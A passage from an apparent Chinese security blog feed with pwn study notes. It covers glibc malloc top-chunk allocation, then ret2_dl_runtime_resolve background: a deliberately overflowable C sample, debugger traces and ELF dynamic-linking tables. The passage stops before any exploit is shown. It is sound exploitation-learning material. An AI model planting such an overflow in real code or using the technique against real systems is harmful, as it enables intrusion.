class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line">      <span class="comment">// 如果 top chunk 大小足够大就从 top chunk 里面分配</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果 top chunk 的大小足够就直接切割分配，否则如果此时还有 fastbin 就触发 malloc_consolidate 重复上述流程，如果没有 fastbin 调用 sysmalloc 分配内存</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;文中未做说明 均是指 glibc 2.23&lt;/p&gt;
&lt;h2 id=&quot;简单源码分析&quot;&gt;&lt;a href=&quot;#简单源码分析&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn 知识图谱</title>
    <link href="https://nocbtm.github.io/2020/02/25/pwn-%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/"/>
    <id>https://nocbtm.github.io/2020/02/25/pwn-知识图谱/</id>
    <published>2020-02-25T04:56:05.000Z</published>
    <updated>2020-04-04T12:10:11.469Z</updated>
    
    <content type="html"><![CDATA[<p><img alt="pwn知识图谱.png" data-src="/imgs/pwn_knowledge_map.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img alt=&quot;pwn知识图谱.png&quot; data-src=&quot;/imgs/pwn_knowledge_map.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ret2_dl_runtime_resolve学习笔记</title>
    <link href="https://nocbtm.github.io/2020/02/24/ret2_dl_runtime_resolve/"/>
    <id>https://nocbtm.github.io/2020/02/24/ret2_dl_runtime_resolve/</id>
    <published>2020-02-24T10:11:46.000Z</published>
    <updated>2020-04-09T13:12:12.482Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.freebuf.com/articles/system/170661.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170661.html</a><br><a href="https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" target="_blank" rel="noopener">https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more</a><br><a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a><br><a href="https://bbs.pediy.com/thread-253833.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253833.htm</a><br><a href="https://blog.csdn.net/conansonic/article/details/54634142" target="_blank" rel="noopener">https://blog.csdn.net/conansonic/article/details/54634142</a></p><h2 id="前置知识：函数执行流程"><a href="#前置知识：函数执行流程" class="headerlink" title="前置知识：函数执行流程"></a>前置知识：函数执行流程</h2><p>因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc fun.c -fno-stack-protector -m32 -o fun</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buffer,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以read函数为例，下断点到read@plt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b *0x80482e0</span></span><br><span class="line">Breakpoint 3 at 0x80482e0</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">►  0x80482e0  &lt;read@plt&gt;                  jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+12] &lt;0x804a00c&gt; </span><br><span class="line"> // 0x804a00c是read的got.plt表地址，里面存放着0x80482e6</span><br><span class="line">   0x80482e6  &lt;read@plt+6&gt;                push   0 // _dl_runtime_resolve第二个参数</span><br><span class="line">   0x80482eb  &lt;read@plt+11&gt;               jmp    0x80482d0</span><br><span class="line">    ↓</span><br><span class="line">   0x80482d0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; // _dl_runtime_resolve第一个参数</span><br><span class="line">   0x80482d6                              jmp    dword ptr [0x804a008] &lt;0xf7fee000&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fee000 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fee001 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fee002 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fee003 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7fee007 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7fee00b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe77e0&gt; //执行完_dl_fixup后eax存放着glibc中read函数的地址</span><br><span class="line">   0xf7fee010 &lt;_dl_runtime_resolve+16&gt;    pop    edx</span><br><span class="line">   0xf7fee011 &lt;_dl_runtime_resolve+17&gt;    mov    ecx, dword ptr [esp]</span><br><span class="line">   0xf7fee014 &lt;_dl_runtime_resolve+20&gt;    mov    dword ptr [esp], eax  //把read函数地址存到esp</span><br><span class="line">   0xf7fee017 &lt;_dl_runtime_resolve+23&gt;    mov    eax, dword ptr [esp + 4]</span><br><span class="line">   0xf7fee01b &lt;_dl_runtime_resolve+27&gt;    ret    0xc //返回到 read函数</span><br><span class="line">   0xf7fee01e                             nop</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/4xw 0x804a00c</span></span><br><span class="line">0x804a00c:0x080482e60xf7df45400x000000000x00000000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4xw 0x804a004</span><br><span class="line">0x804a004:0xf7ffd9180xf7fee0000x080482e60xf7df4540</span><br></pre></td></tr></table></figure><p>通过上面一步一步调试，可以清楚看到函数执行流程，call read@plt –&gt;<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a> –&gt;read@plt+6 –&gt;_dl_runtime_resolve(link_map,rel_offest) –&gt; _dl_fixup –&gt; ret _dl_runtime_resolve+16 –&gt; ret read<br>其中_dl_runtime_resolve函数的两个参数 link_map=0xf7ffd918,rel_offest=0，执行完_dl_runtime_resolve()函数后，就返回到了read函数。</p><p>但绑定的过程是在 _dl_fixup中实现的，接下通过_dl_fixup的源码分析一下函数绑定的实现<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> stack 6</span></span><br><span class="line">00:0000│ esp  0xffffcf04 —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line">01:0004│      0xffffcf08 ◂— 0x0</span><br><span class="line">02:0008│      0xffffcf0c —▸ 0x8048424 (fun+25) ◂— add    esp, 0x10</span><br><span class="line">03:000c│      0xffffcf10 ◂— 0x0</span><br><span class="line">04:0010│      0xffffcf14 —▸ 0xffffcf20 ◂— 0x8000</span><br><span class="line">05:0014│      0xffffcf18 ◂— 0x200</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xf7fee00b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe77e0&gt;</span><br><span class="line">        arg[0]: 0xffffcf94 ◂— 0x0</span><br><span class="line">        arg[1]: 0xffffcf70 ◂— 0x1</span><br></pre></td></tr></table></figure><p>借用Veritas501大佬的图更直观的了解这个过程</p><p><img alt="" data-src="/imgs/ret2-dl-runtime-resolve-1.png" class="lozad"></p><h2 id="ELF关于动态链接的一些关键section"><a href="#ELF关于动态链接的一些关键section" class="headerlink" title="ELF关于动态链接的一些关键section"></a>ELF关于动态链接的一些关键section</h2><p>先熟悉一下几个动态链接的一些关键section，以便于分析源码</p><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><p>包含了一些关于动态链接的关键信息，在这个fun上它长这样，事实上这个section所有程序都差不多</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08049F14 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:08049F14                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:08049F14                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C                 Elf32_Dyn &lt;0Ch, &lt;80482A8h&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:08049F24                 Elf32_Dyn &lt;0Dh, &lt;80484B4h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:08049F2C                 Elf32_Dyn &lt;19h, &lt;8049F08h&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:08049F34                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C                 Elf32_Dyn &lt;1Ah, &lt;8049F0Ch&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C                 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54                 Elf32_Dyn &lt;5, &lt;804821Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C                 Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64                 Elf32_Dyn &lt;0Ah, &lt;4Ah&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049F74                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C                 Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84                 Elf32_Dyn &lt;2, &lt;10h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049F94                 Elf32_Dyn &lt;17h, &lt;8048298h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C                 Elf32_Dyn &lt;11h, &lt;8048290h&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049FA4                 Elf32_Dyn &lt;12h, &lt;8&gt;&gt;    ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049FB4                 Elf32_Dyn &lt;6FFFFFFEh, &lt;8048270h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4                 Elf32_Dyn &lt;6FFFFFF0h, &lt;8048266h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure><p>这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针，可以readelf -S fun看一下各个段的地址，会发现这三个section的地址跟在ida所示的地址是一样的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">readelf -S fun</span><br><span class="line">共有 31 个节头，从偏移量 0x17f0 开始：</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048266 000266 00000a 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048270 000270 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048290 000290 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482a8 0002a8 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048310 000310 0001a2 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        080484b4 0004b4 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        080484c8 0004c8 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        080484d0 0004d0 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048504 000504 0000ec 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4  //dynamic</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1</span><br><span class="line">  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 0016e3 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001054 000460 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014b4 00022f 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><h3 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481CC ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;offset aRead - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; "read"</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804821C, 0, 0, 20h, 0, 0&gt; ; "__gmon_start__"</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804821C, 0, 0, 12h, 0, \ ; "__libc_start_main"</span><br><span class="line">LOAD:080481FC                            0&gt;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804821C, \ ; "_IO_stdin_used"</span><br><span class="line">LOAD:0804820C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br></pre></td></tr></table></figure><p>这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure></p><h3 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h3><p>一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个read。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x080481AC的偏移。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804821C ; ELF String Table</span><br><span class="line">LOAD:0804821C byte_804821C    db 0                    ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804821C                                         ; LOAD:080481EC↑o ...</span><br><span class="line">LOAD:0804821D aLibcSo6        db 'libc.so.6',0</span><br><span class="line">LOAD:08048227 aIoStdinUsed    db '_IO_stdin_used',0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:08048236 aRead           db 'read',0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804823B aLibcStartMain  db '__libc_start_main',0</span><br><span class="line">LOAD:0804823B                                         ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:0804824D aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:0804825C aGlibc20        db 'GLIBC_2.0',0</span><br><span class="line">LOAD:08048266                 align 4</span><br><span class="line">LOAD:08048268                 dd 2, 10002h, 10001h, 1, 10h, 0</span><br><span class="line">LOAD:08048280                 dd 0D696910h, 20000h, 40h, 0</span><br></pre></td></tr></table></figure></p><h3 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048290 ; ELF REL Relocation Table</span><br><span class="line">LOAD:08048290                 Elf32_Rel &lt;8049FFCh, 206h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048298 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048298                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:080482A0                 Elf32_Rel &lt;804A010h, 307h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br></pre></td></tr></table></figure><p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></p><h2 id="gilbc2-23-dl-fixup源码分析"><a href="#gilbc2-23-dl-fixup源码分析" class="headerlink" title="gilbc2.23 _dl_fixup源码分析"></a>gilbc2.23 _dl_fixup源码分析</h2><p>glibc源码阅读网站 <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#61" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#61</a><br>glibc源码下载网站 <a href="http://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/glibc/</a></p><p>_dl_fixup函数的两个参数  struct link_map *l , ELFW(Word) reloc _arg都在glibc/elf/link.h中定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* 前几个成员是使用调试器的协议的一部分.</span></span><br><span class="line"><span class="comment">       这与SVR4中使用的格式相同.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* ELF文件中的地址与内存中的地址之间的差异*/</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* 绝对文件名对象.  */</span></span><br><span class="line">    ElfW(Dyn) 